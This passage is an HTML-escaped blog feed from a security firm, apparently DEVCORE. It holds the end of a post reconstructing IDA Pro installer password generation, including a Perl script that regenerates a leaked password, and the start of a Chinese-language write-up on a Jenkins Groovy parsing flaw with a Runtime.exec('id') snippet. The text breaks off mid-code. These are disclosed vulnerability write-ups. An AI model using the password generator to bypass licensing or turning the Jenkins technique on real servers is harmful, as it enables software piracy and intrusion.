                &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After a month, we finally generated the IDA Pro installation passwords successfully with Perl, and the correct charset ordering is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/code&gt;. For example, we can generate the hacking team’s leaked password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FgVQyXZY2XFk&lt;/code&gt; with the following script:&lt;/p&gt;

&lt;div class=&quot;language-perl highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env perl&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;@_e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;split&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;abcdefghijkmpqrstuvwxyzABCDEFGHJKLMPQRSTUVWXYZ23456789&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3326487116&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;srand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;&quot;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;rand&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$pw&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&quot;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this, we can build a dictionary of installation password, which effectively increase the efficiency of brute force attack. Generally, we can compute the password of one installer in 10 minutes.&lt;/p&gt;

&lt;p&gt;We have reported this issue to Hex-Rays, and they promised to harden the installation password immediately.&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;In this article, we discussed the possibility of installing IDA Pro without owning installation password. In the end, we found plaintext password in the program memory of Linux and MacOS version. On the other hand, we determined the password generation methodology of Windows version. Therefore, we can build a dictionary to accelerate brute force attack. Finally, we can get one password at a reasonable time.&lt;/p&gt;

&lt;p&gt;We really enjoy this process: surmise wisely and prove it with our best. It can broaden our experience no matter the result is correct or not. This is why we took a whole month to verify such a difficult surmise. We also take this attitude in our &lt;a href=&quot;https://devco.re/en/services/red-team/&quot;&gt;Red Team Assessment&lt;/a&gt;. You would love to give it a try!&lt;/p&gt;

&lt;p&gt;Lastly, we would like to thank for the friendly and rapid response from Hex-Rays. Although this issue is not included in &lt;a href=&quot;https://www.hex-rays.com/bugbounty.shtml&quot;&gt;Security Bug Bounty Program&lt;/a&gt;, they still generously awarded us IDA Pro Linux and MAC version, and upgraded the Windows version for us. We really appreciate it.&lt;/p&gt;

&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Jan 31, 2019 - Report to Hex-Rays&lt;/li&gt;
  &lt;li&gt;Feb 01, 2019 - Hex-Rays promised to harden the installation password and reported to BitRock&lt;/li&gt;
  &lt;li&gt;Feb 11, 2019 - BitRock released InstallBuilder 19.2.0&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/</link>
                <guid>https://devco.re/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en</guid>
                <pubDate>Fri, 21 Jun 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/02/19/hacking-Jenkins-part2-abusing-meta-programming-for-unauthenticated-RCE/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;嗨! 大家今天過得好嗎?&lt;/p&gt;

&lt;p&gt;這篇文章是 Hacking Jenkins 系列的下集! 給那些還沒看過上篇文章的同學，可以訪問下面鏈結，補充一些基本知識及了解之前如何從 Jenkins 中的動態路由機制到串出各種不同的攻擊鏈!&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/01/16/hacking-Jenkins-part1-play-with-dynamic-routing/&quot;&gt;Hacking Jenkins Part 1 - Play with Dynamic Routing
&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;如上篇文章所說，為了最大程度發揮漏洞的效果，想尋找一個代碼執行的漏洞可以與 ACL 繞過漏洞搭配，成為一個不用認證的遠端代碼執行! 不過在最初的嘗試中失敗了，由於動態路由機制的特性，Jenkins 在遇到一些危險操作時(如 &lt;a href=&quot;http://jenkins.local/script&quot;&gt;Script Console&lt;/a&gt;)都會再次的檢查權限! 導致就算可以繞過最前面的 ACL 層依然無法做太多事情!&lt;/p&gt;

&lt;p&gt;直到 Jenkins 在 2018-12-05 發佈的 &lt;a href=&quot;https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595&quot;&gt;Security Advisory&lt;/a&gt; 修復了前述我所回報的動態路由漏洞! 為了開始撰寫這份技術文章(Hacking Jenkins 系列文)，我重新複習了一次當初進行代碼審查的筆記，當中對其中一個跳板(gadget)想到了一個不一樣的利用方式，因而有了這篇故事! 這也是近期我所寫過覺得比較有趣的漏洞之一，非常推薦可以仔細閱讀一下!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;要解釋這次的漏洞 &lt;a href=&quot;https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266&quot;&gt;CVE-2019-1003000&lt;/a&gt; 必須要從 Pipeline 開始講起! 大部分開發者會選擇 Jenkins 作為 CI/CD 伺服器的其中一個原因是因為 Jenkins 提供了一個很強大的 Pipeline 功能，使開發者可以方便的去撰寫一些 Build Script 以完成自動化的編譯、測試及發佈! 你可以想像 Pipeline 就是一個小小的微語言可以去對 Jenkins 進行操作(而實際上 Pipeline 是基於 Groovy 的一個 DSL)&lt;/p&gt;

&lt;p&gt;為了檢查使用者所撰寫的 Pipeline Script 有沒有語法上的錯誤(Syntax Error)，Jenkins 提供了一個介面給使用者檢查自己的 Pipeline! 這裡你可以想像一下，如果你是程式設計師，你要如何去完成這個功能呢? 你可以自己實現一個語法樹(AST, Abstract Syntax Tree)解析器去完成這件事，不過這太累了，最簡單的方式當然是套用現成的東西!&lt;/p&gt;

&lt;p&gt;前面提到，Pipeline 是基於 Groovy 所實現的一個 DSL，所以 Pipeline 必定也遵守著 Groovy 的語法! 所以最簡單的方式是，只要 Groovy 可以成功解析(parse)，那就代表這份 Pipeline 的語法一定是對的! Jenkins 實作檢查的程式碼約是下面這樣子:&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;doCheckScriptCompile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nd&quot;&gt;@QueryParameter&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;CpsGroovyShell&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;forTrusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;CpsGroovyShellFactory&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;withParent&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;trusted&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;build&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getClassLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CompilationFailedException&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JSONArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;fromObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toCheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;CpsFlowDefinitionValidator&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;CheckStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;SUCCESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;asJSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// Approval requirements are managed by regular stapler form validation (via doCheckScript)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;這裡使用了 &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;GroovyClassLoader.parseClass(…)&lt;/a&gt; 去完成 Groovy 語法的解析! 值得注意的是，由於這只是一個 AST 的解析，在沒有執行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 的方法前，任何危險的操作是不會被執行的，例如嘗試去解析這段 Groovy 代碼會發現其實什麼事都沒發生 :(&lt;/p&gt;

&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;classLoader&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&apos;&apos;
print java.lang.Runtime.getRuntime().exec(&quot;id&quot;)
&apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;從程式開發者的角度來看，Pipeline 可以操作 Jenkins 那一定很危險，因此要用嚴格的權限保護住! 但這只是一段簡單的語法錯誤檢查，而且呼叫到的地方很多，限制太嚴格的權限只會讓自己綁手綁腳的!&lt;/p&gt;

&lt;p&gt;上面的觀點聽起來很合理，就只是一個 AST 的解析而且沒有任何 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute()&lt;/code&gt; 方法應該很安全，但恰巧這裡就成為了我們第一個入口點! 其實第一次看到這段代碼時，也想不出什麼利用方法就先跳過了，直到要開始撰寫技術文章重新溫習了一次，我想起了說不定 Meta-Programming 會有搞頭!&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;什麼是-meta-programming&quot;&gt;什麼是 Meta-Programming&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;首先我們來解釋一下什麼是 Meta-Programming!&lt;/p&gt;

&lt;p&gt;Meta-Programming 是一種程式設計的思維! Meta-Programming 的精髓在於提供了一個抽象層次給開發者用另外一種思維去撰寫更高靈活度及更高開發效率的代碼。其實 Meta-Programming 並沒有一個很嚴謹的定義，例如使用程式語言編譯所留下的 Metadata 去動態的產生程式碼，或是把程式自身當成資料，透過編譯器(compiler)或是直譯器(interpreter)去撰寫代碼都可以被說是一種 Meta-Programming! 而其中的哲學其實非常廣泛甚至已經可以被當成程式語言的一個章節來獨立探討!&lt;/p&gt;

&lt;p&gt;大部分的文章或是書籍在解釋 Meta-Programming 的時候通常會這樣解釋:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;用程式碼(code)產生程式碼(code)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;如果還是很難理解，你可以想像程式語言中的 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval(...)&lt;/code&gt; 其實就是一種廣義上的 Meta-Programming! 雖然不甚精確，但用這個比喻可以快速的理解 Meta-Programming! 其實就是用程式碼(eval 這個函數)去產生程式碼(eval 出來的函數)! 在程式開發上，Meta-Programming 也有著極其多的應用，例如:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;C 語言中的 Macro&lt;/li&gt;
  &lt;li&gt;C++ 的 Template&lt;/li&gt;
  &lt;li&gt;Ruby (Ruby 本身就是一門將 Meta-Programming 發揮到極致的語言，甚至還有專門的&lt;a href=&quot;http://shop.oreilly.com/product/9781934356470.do&quot;&gt;書1&lt;/a&gt;, &lt;a href=&quot;http://shop.oreilly.com/product/9781941222126.do&quot;&gt;書2&lt;/a&gt;)&lt;/li&gt;
  &lt;li&gt;Java 的 Annotation 註解&lt;/li&gt;
  &lt;li&gt;各種 DSL(Domain Specific Language) 應用，例如 &lt;a href=&quot;http://sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; 及 &lt;a href=&quot;https://gradle.org/&quot;&gt;Gradle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;而當我們在談論 Meta-Programming 時，依照作用的範圍我們大致分成 &lt;strong&gt;(1)編譯時期&lt;/strong&gt; 及 &lt;strong&gt;(2)執行時期&lt;/strong&gt;這兩種 Meta-Programming! 而我們今天的重點，就是在編譯時期的 Meta-Programming!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;P.S. 我也不是一位 Programming Language 大師，如有不精確或者覺得教壞小朋友的地方再請多多包涵 &amp;lt;(_ _)&amp;gt;&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;如何利用&quot;&gt;如何利用&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;從前面的段落中我們發現 Jenkins 使用 &lt;a href=&quot;http://docs.groovy-lang.org/latest/html/api/groovy/lang/GroovyClassLoader.html#parseClass-java.lang.String-&quot;&gt;parseClass(…)&lt;/a&gt; 去檢查語法錯誤，我們也想起了 Meta-Programming 可在編譯時期對程式碼做一些動態的操作! 設計一個編譯器(或解析器)是一件很麻煩的事情，裡面會有各種骯髒的實作或是奇怪的功能，所以一個很直覺的想法就是，是否可以透過編譯器一些副作用(Side Effect)去完成一些事情呢?&lt;/p&gt;

&lt;p&gt;舉幾個淺顯易懂的例子，如 C 語言巨集擴展所造成的資源耗盡&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define a 1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
#define b a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
#define c b,b,b,b,b,b,b,b,b,b,b,b,b,b,b,b
#define d c,c,c,c,c,c,c,c,c,c,c,c,c,c,c,c
#define e d,d,d,d,d,d,d,d,d,d,d,d,d,d,d,d
#define f e,e,e,e,e,e,e,e,e,e,e,e,e,e,e,e
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__int128&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;編譯器的資源耗盡(用 18 bytes 產生 16G 的執行檔)&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;或是用編譯器來幫你算費式數列&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;fib&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;value&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
